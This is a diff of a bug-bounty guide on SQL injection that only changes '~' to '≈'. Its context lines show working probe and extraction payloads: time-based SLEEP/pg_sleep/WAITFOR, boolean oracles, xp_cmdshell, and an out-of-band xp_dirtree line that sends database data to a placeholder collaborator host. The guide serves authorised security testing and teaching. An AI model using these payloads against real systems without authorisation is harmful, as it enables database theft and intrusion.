@@ -101,7 +101,7 @@ Baseline a normal value, then probe:
 1. `id=1'` → SQL error / 500 / different page? → string break or error-based.
 2. `id=2-1` → returns the `id=1` row? → **numeric** context (arithmetic evaluated) and injectable.
 3. `id=1 AND 1=1` vs `id=1 AND 1=2` → different responses? → **boolean** oracle.
-4. `id=1 AND SLEEP(5)` → ~5s delay? → **time** blind (and MySQL).
+4. `id=1 AND SLEEP(5)` → ≈5s delay? → **time** blind (and MySQL).
 5. `id=1' ORDER BY 1-- -` climbing → errors at N ⇒ column count for **UNION**.
 
 ### Q12. Why is "my quote didn't error" not proof of safety?
@@ -136,7 +136,7 @@ A **controlled query change**: `id=1 AND 1=1` (row shows) vs `id=1 AND 1=2` (row
 | `xp_cmdshell 'whoami'` returns output | RCE |
 
 ### Q19. How do I avoid false positives on a "slow" endpoint?
-"Slow" ≠ time-based. Require a **controlled** delay: the `SLEEP(5)` payload delays ~5s while the identical request with `SLEEP(0)` returns fast, and it reproduces across several retries. Vary the delay (3s, then 7s) and confirm the response time tracks it. Random slowness that doesn't track your sleep value is just a slow endpoint.
+"Slow" ≠ time-based. Require a **controlled** delay: the `SLEEP(5)` payload delays ≈5s while the identical request with `SLEEP(0)` returns fast, and it reproduces across several retries. Vary the delay (3s, then 7s) and confirm the response time tracks it. Random slowness that doesn't track your sleep value is just a slow endpoint.
 
 ### Q20. Where do hunters most often miss SQLi?
 (1) **Identifier context** (`?sort=`/`?order=`) — they try `'`, get nothing, and leave, missing that the sort column is concatenated raw. (2) **Headers logged to audit tables** — unauthenticated second-order INSERT sinks. (3) **Second-order** — input parameterized on insert but string-built by a later admin/report query. (4) **Blind** — they expect echoed data and don't build a boolean/time oracle.
@@ -166,9 +166,9 @@ Three routes: (1) **Column index** — `?sort=1` vs `?sort=2` reorder differentl
 > *Plain version:* the most-missed SQLi, because `'` genuinely does nothing here — your input is a *column name*, not a quoted value. But you can still smuggle logic in: flip `?sort=1`↔`?sort=2` and watch the order change (proof it's live), or feed a `CASE WHEN (question) THEN ... ELSE ...` so the *ordering itself* answers yes/no, or a `(SELECT SLEEP(5))` to read by the clock. Tons of "safe" apps parameterize their values but paste the **sort column** in raw — so a well-defended app is often wide open right here.
 
 ### Q27. How does boolean-based blind extraction work?
-You have a 1-bit oracle (TRUE vs FALSE → different response). Read a value char-by-char: `SUBSTRING(value,pos,1)='x'`, or faster, `ASCII(SUBSTRING(value,pos,1))>mid` and **binary-search** the ASCII code (~7 requests/char instead of ~95). Get the length first (`LENGTH(value)>N`, binary-searched) so you know when to stop.
+You have a 1-bit oracle (TRUE vs FALSE → different response). Read a value char-by-char: `SUBSTRING(value,pos,1)='x'`, or faster, `ASCII(SUBSTRING(value,pos,1))>mid` and **binary-search** the ASCII code (≈7 requests/char instead of ≈95). Get the length first (`LENGTH(value)>N`, binary-searched) so you know when to stop.
 
-> *Plain version:* the page shows no data, but it *reacts* differently to true vs false — a yes/no light bulb. That's all you need: you play 20-questions to spell out any value. Instead of asking "is this letter 'a'? 'b'? 'c'?" (up to 95 guesses), you binary-search — "is its code above 77? above 109?" — halving the range each time, so ~7 questions nail each character. Get the length first so you know where to stop. Tedious but total; `sqli_blind.py` does the guessing for you.
+> *Plain version:* the page shows no data, but it *reacts* differently to true vs false — a yes/no light bulb. That's all you need: you play 20-questions to spell out any value. Instead of asking "is this letter 'a'? 'b'? 'c'?" (up to 95 guesses), you binary-search — "is its code above 77? above 109?" — halving the range each time, so ≈7 questions nail each character. Get the length first so you know where to stop. Tedious but total; `sqli_blind.py` does the guessing for you.
 
 ### Q28. How does time-based blind work when there's no visible difference?
 Make the query **pause** on a condition and read the answer from the response time: `IF(<condition>,SLEEP(5),0)` (MySQL), `CASE WHEN <cond> THEN pg_sleep(5) ELSE 1 END` (PG), `IF (<cond>) WAITFOR DELAY '0:0:5'` (MSSQL), `CASE WHEN <cond> THEN dbms_pipe.receive_message(('a'),5) ELSE 1 END` (Oracle). Delayed ⇒ condition true. Slowest channel, but it works whenever the query runs.
@@ -292,7 +292,7 @@ When a cleaner, higher-impact bug shares the sink — e.g. the same parameter al
 # LEVEL 5 — BLIND EXTRACTION, OOB, STACKED & SECOND-ORDER
 
 ### Q63. How do I make blind extraction fast?
-**Binary-search** each character's ASCII code with `>` comparisons (~7 requests/char vs ~95 linear), and binary-search the **length** first so you know when to stop. Prefer **boolean** over **time** when both exist (no fixed per-request delay). Parallelize cautiously (low concurrency) and reuse the connection (keep-alive). `poc/sqli_blind.py` implements the binary search for both modes.
+**Binary-search** each character's ASCII code with `>` comparisons (≈7 requests/char vs ≈95 linear), and binary-search the **length** first so you know when to stop. Prefer **boolean** over **time** when both exist (no fixed per-request delay). Parallelize cautiously (low concurrency) and reuse the connection (keep-alive). `poc/sqli_blind.py` implements the binary search for both modes.
 
 ### Q64. How do I build a reliable boolean oracle when the diff is subtle?
 Find a stable signal: a specific marker string present/absent ("in stock"/"out of stock"), a length delta that **reproduces**, a status-code change, or a redirect. Confirm by re-requesting TRUE and FALSE a few times and checking the difference is **stable** (excludes caching/jitter). `sqli_fuzz.py` does this re-check before flagging a boolean candidate.
@@ -395,10 +395,10 @@ Same logic, different placement: put the payload in the **JSON value** (mind the
 # SEVERITY, VALIDITY & FALSE POSITIVES
 
 ### Q92. How do triagers rate SQLi severity?
-RCE on the DB host → **Critical** (~10.0). Auth bypass → admin (ATO) → **Critical** (~9.x). Arbitrary DB read incl. hashes/PII at scale → **High–Critical**. File read → **High** (pivots). File write→shell → **Critical**. Blind read of non-cred data → **High**. Reflected error / lone 500 with no query change → **Low (info)** at best. Anchor to **CWE-89** (+287/78 for auth/RCE).
+RCE on the DB host → **Critical** (≈10.0). Auth bypass → admin (ATO) → **Critical** (≈9.x). Arbitrary DB read incl. hashes/PII at scale → **High–Critical**. File read → **High** (pivots). File write→shell → **Critical**. Blind read of non-cred data → **High**. Reflected error / lone 500 with no query change → **Low (info)** at best. Anchor to **CWE-89** (+287/78 for auth/RCE).
 
 ### Q93. What's the CVSS vector for a typical read-only SQLi?
-`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` ≈ **7.5 (High)** for unauthenticated arbitrary read. Raise `I` if you can write, raise to `S:C` and `A:H` for RCE (→ ~10.0), and add **CWE-287** for auth bypass / **CWE-78** for OS-command RCE.
+`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` ≈ **7.5 (High)** for unauthenticated arbitrary read. Raise `I` if you can write, raise to `S:C` and `A:H` for RCE (→ ≈10.0), and add **CWE-287** for auth bypass / **CWE-78** for OS-command RCE.
 
 ### Q94. What are the top SQLi false positives to never report?
 A `'` causing a 500/stack trace (a crash, not control); a reflected SQL error string (info leak, not injection); a one-off length blip (jitter/caching); "sqlmap flagged it" with no hand proof; a slow endpoint mislabeled "time-based"; parameterized-ORM input that's merely reflected; NoSQL `$ne`/`$gt` behavior; and any **destructive** "proof" (a DROP/DELETE that ran).
@@ -455,7 +455,7 @@ OOB      '; EXEC master..xp_dirtree '\\'+(SELECT @@version)+'.collab\x'-- -   (M
 # REAL-WORLD PATTERNS & REFERENCES
 
 ### Q101. What real-world apps/surfaces have shown SQLi, and any notable cases?
-Login forms (`WHERE user='$u' AND pass='$p'`), `?id=`/search/filter/`?sort=` params, headers logged to audit tables, report/export builders, and ORM raw escape hatches. Notable cases (verify details before citing): **MOVEit Transfer CVE-2023-34362** (pre-auth SQLi→RCE, mass-exploited by Cl0p, 2023); **Accellion FTA CVE-2021-27101** (Cl0p); **Drupalgeddon CVE-2014-3704** (pre-auth Drupal 7 SQLi); **Joomla! CVE-2017-8917**; **Magento CVE-2019-7139**; historic breaches **Heartland (2008)**, **Sony Pictures (2011, LulzSec)**, **Yahoo Voices (2012, ~450k creds, union-based)**, **TalkTalk (2015)**.
+Login forms (`WHERE user='$u' AND pass='$p'`), `?id=`/search/filter/`?sort=` params, headers logged to audit tables, report/export builders, and ORM raw escape hatches. Notable cases (verify details before citing): **MOVEit Transfer CVE-2023-34362** (pre-auth SQLi→RCE, mass-exploited by Cl0p, 2023); **Accellion FTA CVE-2021-27101** (Cl0p); **Drupalgeddon CVE-2014-3704** (pre-auth Drupal 7 SQLi); **Joomla! CVE-2017-8917**; **Magento CVE-2019-7139**; historic breaches **Heartland (2008)**, **Sony Pictures (2011, LulzSec)**, **Yahoo Voices (2012, ≈450k creds, union-based)**, **TalkTalk (2015)**.
 
 ### Q102. What are the must-read references?
 PortSwigger's *SQL injection* topic + cheat sheet + labs (the best hands-on resource), OWASP's *SQL Injection* page, **WSTG-INPV-05**, the OWASP *SQL Injection Prevention Cheat Sheet*, PayloadsAllTheThings *SQL Injection*, HackTricks *SQL injection* (+ per-DBMS pages), and the `sqlmap` docs. CWE-89/74/287/78 for severity anchoring.
